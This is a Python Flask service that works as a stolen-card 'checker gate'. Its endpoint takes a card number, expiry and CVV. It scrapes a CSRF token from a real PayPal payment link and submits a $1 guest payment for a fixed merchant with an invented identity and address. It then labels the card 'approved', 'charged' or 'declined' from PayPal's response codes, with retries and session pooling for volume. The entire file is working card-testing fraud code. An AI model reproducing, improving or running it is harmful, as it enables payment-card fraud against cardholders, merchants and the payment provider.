import requests
import json
import logging
import re
import time
from flask import Flask, jsonify, request
from werkzeug.middleware.proxy_fix import ProxyFix
from collections import defaultdict, deque
import threading
from datetime import datetime
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import hashlib
import os
from functools import wraps

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app)

# Configuration
RATE_LIMIT_WINDOW = 3  # seconds
MAX_REQUESTS_PER_WINDOW = 1  # requests per IP per window
SESSION_POOL_SIZE = 100  # Number of sessions in the pool
CLEANUP_INTERVAL = 300  # seconds (5 minutes)

# --- Status Mapping Rules ---
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED",
    "TOKEN_EXTRACTION_ERROR",
    "NETWORK_ERROR",
    "INTERNAL_ERROR",
    "INVALID_MONTH",
    "UNKNOWN_ERROR",
    "RATE_LIMIT_EXCEEDED",
    "TIMEOUT_ERROR"
}

# In-memory storage for rate limiting (in production, use Redis)
ip_request_timestamps = defaultdict(deque)
rate_limit_lock = threading.Lock()

# Session pool
session_pool = []
pool_lock = threading.Lock()

# Initialize session pool
def initialize_session_pool():
    for _ in range(SESSION_POOL_SIZE):
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST"]
        )
        
        # Configure HTTP adapter with connection pooling
        adapter = HTTPAdapter(
            pool_connections=20,
            pool_maxsize=20,
            max_retries=retry_strategy
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        session_pool.append(session)

# Get a session from the pool
def get_session():
    with pool_lock:
        if session_pool:
            return session_pool.pop()
        else:
            # If pool is empty, create a new session
            session = requests.Session()
            
            retry_strategy = Retry(
                total=3,
                backoff_factor=1,
                status_forcelist=[429, 500, 502, 503, 504],
                allowed_methods=["HEAD", "GET", "POST"]
            )
            
            adapter = HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=retry_strategy
            )
            
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            
            return session

# Return a session to the pool
def return_session(session):
    with pool_lock:
        if len(session_pool) < SESSION_POOL_SIZE:
            session_pool.append(session)

# Rate limiting decorator
def rate_limit(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        
        with rate_limit_lock:
            now = time.time()
            timestamps = ip_request_timestamps[client_ip]
            
            # Remove timestamps older than the window
            while timestamps and timestamps[0] < now - RATE_LIMIT_WINDOW:
                timestamps.popleft()
            
            # Check if the limit is exceeded
            if len(timestamps) >= MAX_REQUESTS_PER_WINDOW:
                return jsonify({
                    "status": "declined",
                    "code": "RATE_LIMIT_EXCEEDED",
                    "message": f"Too many requests. Please wait {RATE_LIMIT_WINDOW} seconds between requests."
                }), 429
            
            # Add current timestamp
            timestamps.append(now)
        
        return f(*args, **kwargs)
    
    return decorated_function

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content with multiple patterns."""
    try:
        patterns = [
            r'"csrfToken":"([^"]+)"',
            r'csrfToken["\']?\s*:\s*["\']([^"\']+)["\']',
            r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
            r'data-csrf=["\']([^"\']+)["\']',
            r'"token":"([^"]+)"',
            r'name="_token"\s+value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        
        logging.warning(f"CSRF token not found. Page content snippet: {html_content[:500]}...")
        return None
    except Exception as e:
        logging.error(f"Error extracting CSRF token: {e}")
        return None

def is_valid_card_number(number):
    """Validate credit card number using Luhn algorithm."""
    try:
        digits = [int(d) for d in number if d.isdigit()]
        checksum = digits.pop()
        digits.reverse()
        doubled = [d*2 if i%2==0 else d for i,d in enumerate(digits)]
        summed = [d-9 if d>9 else d for d in doubled]
        total = sum(summed) + checksum
        return total % 10 == 0
    except:
        return False

def process_paypal_payment(card_details_string):
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    # --- 1. Parse and Validate Card Details ---
    parts = card_details_string.split('|')
    if len(parts) != 4:
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'}

    card_number, month, year, cvv = [p.strip() for p in parts]

    # Enhanced card validation
    if not is_valid_card_number(card_number):
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid card number.'}
    
    if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
        return {'code': 'INVALID_MONTH', 'message': 'Invalid expiration month provided.'}
    if not year.isdigit():
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if len(year) == 2: year = '20' + year
    elif len(year) != 4: return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration year format.'}
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid CVV format.'}

    # Validate expiration date
    try:
        exp_month = int(month)
        exp_year = int(year)
        current_date = datetime.now()
        exp_date = datetime(exp_year, exp_month, 1)
        
        # Add one month to expiration date to account for the end of the month
        if exp_month == 12:
            exp_date = datetime(exp_year + 1, 1, 1)
        else:
            exp_date = datetime(exp_year, exp_month + 1, 1)
        
        if exp_date <= current_date:
            return {'code': 'EXPIRED_CARD', 'message': 'Card has expired.'}
    except ValueError:
        return {'code': 'VALIDATION_ERROR', 'message': 'Invalid expiration date format.'}

    expiry_date = f"{month}/{year}"
    card_type = 'VISA' if card_number.startswith('4') else ('MASTER_CARD' if card_number.startswith('5') else ('AMEX' if card_number.startswith('3') else 'UNKNOWN'))
    currency_conversion_type = 'VENDOR' if card_type == 'AMEX' else 'PAYPAL'
    card_details = {'cardNumber': card_number, 'type': card_type, 'expirationDate': expiry_date, 'securityCode': cvv, 'postalCode': '10010'}

    # --- 2. Execute PayPal Request Sequence with Comprehensive Retry Logic ---
    
    session = get_session()
    token = None
    
    try:
        max_acquisition_retries = 3
        for acquisition_attempt in range(max_acquisition_retries):
            csrf_token = None
            max_csrf_retries = 3
            for csrf_attempt in range(max_csrf_retries):
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache', 'Pragma': 'no-cache',
                }
                try:
                    response = session.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', headers=headers, timeout=15)
                    response.raise_for_status()
                    csrf_token = extract_csrf_token(response.text)
                    if csrf_token:
                        logging.info(f"Successfully extracted CSRF token on attempt {csrf_attempt + 1}.")
                        break
                    else:
                        logging.warning(f"Attempt {csrf_attempt + 1}/{max_csrf_retries}: CSRF token not found. Retrying...")
                except requests.exceptions.RequestException as e:
                    logging.warning(f"Attempt {csrf_attempt + 1}/{max_csrf_retries}: Network error while fetching initial page: {e}. Retrying...")
                
                if csrf_attempt < max_csrf_retries - 1:
                    time.sleep(2)

            if not csrf_token:
                logging.error(f"Failed to extract CSRF token after {max_csrf_retries} attempts on acquisition try {acquisition_attempt + 1}.")
                if acquisition_attempt < max_acquisition_retries - 1:
                    time.sleep(3)
                    continue
                else:
                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract CSRF token from PayPal after multiple retries.'}

            # --- Request 2: Create Order ---
            headers = {
                'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'x-csrf-token': csrf_token,
            }
            json_data = {
                'link_id': 'R2FGT68WSSRLW', 'merchant_id': '32BACX6X7PYMG', 'quantity': '1', 'amount': '1',
                'currency': 'USD', 'currencySymbol': '$', 'funding_source': 'CARD',
                'button_type': 'VARIABLE_PRICE', 'csrfRetryEnabled': True,
            }
            
            try:
                response = session.post('https://www.paypal.com/ncp/api/create-order', cookies=session.cookies, headers=headers, json=json_data, timeout=10)
                response.raise_for_status()
                response_data = response.json()
            except requests.exceptions.RequestException as e:
                logging.error(f"Network error during create-order call on acquisition try {acquisition_attempt + 1}: {e}")
                if acquisition_attempt < max_acquisition_retries - 1:
                    time.sleep(3)
                    continue
                else:
                    return {'code': 'NETWORK_ERROR', 'message': 'Failed to connect to PayPal create-order API.'}
            except ValueError:
                logging.error(f"Invalid JSON response from create-order on acquisition try {acquisition_attempt + 1}: {response.text}")
                if acquisition_attempt < max_acquisition_retries - 1:
                    time.sleep(3)
                    continue
                else:
                    return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'PayPal returned an invalid JSON response.'}
            
            if 'context_id' in response_data:
                token = response_data['context_id']
                logging.info(f"Successfully extracted token: {token}")
                break
            else:
                logging.error(f"Token extraction failed on acquisition try {acquisition_attempt + 1}. Status: {response.status_code}. Response Body: {response.text}")
                if acquisition_attempt < max_acquisition_retries - 1:
                    logging.warning("Retrying entire token acquisition process...")
                    time.sleep(3)
                    continue

        if not token:
            logging.error(f"Failed to extract token after {max_acquisition_retries} full acquisition attempts.")
            return {'code': 'TOKEN_EXTRACTION_ERROR', 'message': 'Failed to extract token from PayPal response after multiple retries.'}

        # --- Request 3: Submit Card Details ---
        headers = {
            'accept': '*/*', 'content-type': 'application/json', 'origin': 'https://www.paypal.com',
            'paypal-client-context': token, 'paypal-client-metadata-id': token,
            'referer': f'https://www.paypal.com/smart/card-fields?token={token}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-app-name': 'standardcardfields', 'x-country': 'US',
        }

        # --- FIX: The complete, correctly formatted GraphQL query ---
        graphql_query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """
        
        json_data = {
            'query': graphql_query.strip(),
            'variables': {
                'token': token, 'card': card_details, 'phoneNumber': '4073320637',
                'firstName': 'Rockcy', 'lastName': 'og',
                'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'email': 'rocky2@gmail.com', 'currencyConversionType': currency_conversion_type,
            }, 'operationName': None,
        }
        
        # Enhanced GraphQL request with retry logic
        max_graphql_retries = 3
        for graphql_attempt in range(max_graphql_retries):
            try:
                response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', 
                                       cookies=session.cookies, headers=headers, json=json_data, timeout=20)
                
                # Log the response status and headers for debugging
                logging.info(f"PayPal GraphQL response status: {response.status_code}")
                
                # Check if the response is successful
                if response.status_code != 200:
                    logging.error(f"PayPal GraphQL returned non-200 status: {response.status_code}")
                    logging.error(f"PayPal GraphQL response body: {response.text}")
                    if graphql_attempt < max_graphql_retries - 1:
                        logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                        time.sleep(2)
                        continue
                    else:
                        return {'code': 'INTERNAL_ERROR', 'message': f'PayPal returned status {response.status_code}'}
                
                # Try to parse the JSON response
                try:
                    response_data = response.json()
                except ValueError as e:
                    logging.error(f"Failed to parse PayPal GraphQL response as JSON: {e}")
                    logging.error(f"PayPal GraphQL response body: {response.text}")
                    if graphql_attempt < max_graphql_retries - 1:
                        logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                        time.sleep(2)
                        continue
                    else:
                        return {'code': 'INTERNAL_ERROR', 'message': 'PayPal returned an invalid JSON response.'}
                
                # Check if the response contains errors
                if 'errors' in response_data and response_data['errors']:
                    logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
                    error_data = response_data['errors'][0]
                    result = {
                        'code': error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR'),
                        'message': error_data.get('message', 'An unknown error occurred.')
                    }
                    return result
                
                # Check if the response contains the expected data
                if 'data' not in response_data or 'approveGuestPaymentWithCreditCard' not in response_data['data']:
                    logging.error(f"PayPal GraphQL response missing expected data: {json.dumps(response_data)}")
                    if graphql_attempt < max_graphql_retries - 1:
                        logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                        time.sleep(2)
                        continue
                    else:
                        return {'code': 'INTERNAL_ERROR', 'message': 'PayPal returned an unexpected response format.'}
                
                # Check if the payment was approved
                payment_data = response_data['data']['approveGuestPaymentWithCreditCard']
                if not payment_data:
                    logging.error(f"PayPal GraphQL returned empty payment data: {json.dumps(response_data)}")
                    if graphql_attempt < max_graphql_retries - 1:
                        logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                        time.sleep(2)
                        continue
                    else:
                        return {'code': 'INTERNAL_ERROR', 'message': 'PayPal returned an empty payment response.'}
                
                # If we get here, the payment was successful
                result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
                return result
                
            except requests.exceptions.Timeout:
                logging.error(f"Timeout during final GraphQL request (attempt {graphql_attempt + 1}/{max_graphql_retries}).")
                if graphql_attempt < max_graphql_retries - 1:
                    logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                    time.sleep(2)
                    continue
                else:
                    return {'code': 'TIMEOUT_ERROR', 'message': 'Timeout while submitting payment to PayPal.'}
            except requests.exceptions.RequestException as e:
                logging.error(f"Network error during final GraphQL request (attempt {graphql_attempt + 1}/{max_graphql_retries}): {e}")
                if graphql_attempt < max_graphql_retries - 1:
                    logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                    time.sleep(2)
                    continue
                else:
                    return {'code': 'NETWORK_ERROR', 'message': 'Network error while submitting payment to PayPal.'}
            except Exception as e:
                logging.error(f"Unexpected error during final GraphQL request (attempt {graphql_attempt + 1}/{max_graphql_retries}): {e}")
                if graphql_attempt < max_graphql_retries - 1:
                    logging.warning(f"Retrying GraphQL request (attempt {graphql_attempt + 2}/{max_graphql_retries})...")
                    time.sleep(2)
                    continue
                else:
                    return {'code': 'INTERNAL_ERROR', 'message': 'Unexpected error while submitting payment to PayPal.'}
        
        # If we get here, all retries failed
        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal after multiple retries.'}
    
    finally:
        # Always return the session to the pool
        return_session(session)


@app.route('/gate=pp1/cc=<card_details>')
@rate_limit
def payment_gateway(card_details):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
    """
    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
    logging.info(f"Received payment request for card ending in {last_four}")
    
    result = process_paypal_payment(card_details)
    
    code = result.get('code')
    if code in APPROVED_CODES: status = 'approved'
    elif code in DECLINED_CODES: status = 'declined'
    else: status = 'charged'

    final_response = {"status": status, "code": code, "message": result.get('message')}
    logging.info(f"Transaction result: {final_response}")
    return jsonify(final_response)

# Health check endpoint
@app.route('/health')
def health_check():
    """Health check endpoint for load balancers."""
    with pool_lock:
        session_pool_size = len(session_pool)
    
    with rate_limit_lock:
        active_ips = len(ip_request_timestamps)
    
    return jsonify({
        'status': 'healthy',
        'session_pool_size': session_pool_size,
        'active_ips': active_ips,
        'timestamp': time.time()
    })

# Initialize the session pool
initialize_session_pool()

if __name__ == '__main__':
    # For production, use a WSGI server like Gunicorn or uWSGI
    # Example: gunicorn -w 4 -b 0.0.0.0:5000 app:app
    app.run(host='0.0.0.0', port=5000, debug=False)
